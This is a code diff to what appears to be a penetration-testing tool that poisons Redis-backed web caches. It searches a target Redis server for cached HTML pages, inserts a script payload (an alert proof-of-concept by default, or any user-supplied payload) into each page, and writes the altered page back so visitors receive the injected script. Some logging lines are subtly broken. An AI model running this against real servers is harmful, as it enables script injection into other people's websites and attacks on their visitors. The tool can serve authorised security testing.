@@ -1,6 +1,5 @@
 # -*- coding: utf-8 -*-
-import binascii
-import six
+
 import redis
 import logging
 
@@ -50,7 +49,14 @@ def handle_html(config, content):
 	"""
 
 	# --------------------------------------------------------------------------
-	# Prepare info
+	# Selected custom HTML file?
+	# --------------------------------------------------------------------------
+	if config.new_html is not None:
+		with open(config.new_html, "rU") as f:
+			return f.read()
+
+	# --------------------------------------------------------------------------
+	# Search start and end possition of HTML page
 	# --------------------------------------------------------------------------
 	for i, x in enumerate(content):
 		if chr(x) == "<":
@@ -63,10 +69,7 @@ def handle_html(config, content):
 			break
 
 	if pos_ini is None or pos_end is None:
-		return None
-
-	# prefix = content[:pos_ini]
-	# suffix = content[pos_end:]
+		raise ValueError("Not found HTML content into cache")
 
 	txt_content = content[pos_ini:pos_end]
 
@@ -74,31 +77,39 @@ def handle_html(config, content):
 	tree = etree.fromstring(txt_content, etree.HTMLParser())
 	doc_root = tree.getroottree()
 
-	# Find an insert script injection
-	for point in ("title", "body"):
+	results = None
+
+	# Search insertion points
+	for point in ("head", "title", "body", "script", "div", "p"):
 		insert_point = doc_root.find(".//%s" % point)
 
 		if insert_point is None:
 			continue
 
-		# Add the injection
-		ss = etree.Element("script")
-		ss.text = "alert(1)"
+		# --------------------------------------------------------------------------
+		# Add the injection Payload
+		# --------------------------------------------------------------------------
+		if config.poison_payload_file is not None:
+			with open(config.poison_payload_file, "rU") as f:
+				_f_payload = f.read()
+			payload = etree.fromstring(_f_payload)
 
-		insert_point.addnext(ss)
+		elif config.poison_payload:
+			payload = etree.fromstring(config.poison_payload)
+		else:
+			payload = "<script>alert('You're broker injection vulnerable')</script>"
 
-		# Found and insert point -> break
+		insert_point.addnext(payload)
+
+		# Set results
+		results = bytes(etree.tostring(doc_root))
+
 		break
 
 	# --------------------------------------------------------------------------
-	# Fix results
+	# Build results
 	# --------------------------------------------------------------------------
-
-	# Result
-	# result = bytearray(prefix) + bytearray(etree.tostring(doc_root)) + bytearray(suffix)
-
-	return bytes(etree.tostring(doc_root))
-	# return bytes(result)
+	return results
 
 
 # ----------------------------------------------------------------------
@@ -120,7 +131,7 @@ def action_redis_cache_poison(config):
 			cache_keys = [config.cache_key]
 
 	# --------------------------------------------------------------------------
-	# Find caches
+	# Find cache keys
 	# --------------------------------------------------------------------------
 	if config.search_cache is True:
 		log.error("Looking for caches in '%s'..." % config.target)
@@ -146,15 +157,24 @@ def action_redis_cache_poison(config):
 			continue
 
 		# --------------------------------------------------------------------------
-		# Action over caches
+		# Make actions over cache
 		# --------------------------------------------------------------------------
-		# Modify
-		modified = handle_html(config, content)
 
+		# Set injection
+		try:
+			modified = handle_html(config, content)
+		except ValueError as e:
+			log.error("Can't modify cache content: " % e)
+			continue
+		except IOError as e:
+			log.error("Can't modify cache content: " % e)
+
+		# Injection was successful?
 		if modified is None:
-			log.warning("Can't modify content")
+			log.warning("Can't modify content: ensure that content is HTML")
+			continue
 
-		# Reset information
+		# Set injection into server
 		con.setex(val, 200, modified)
 
 
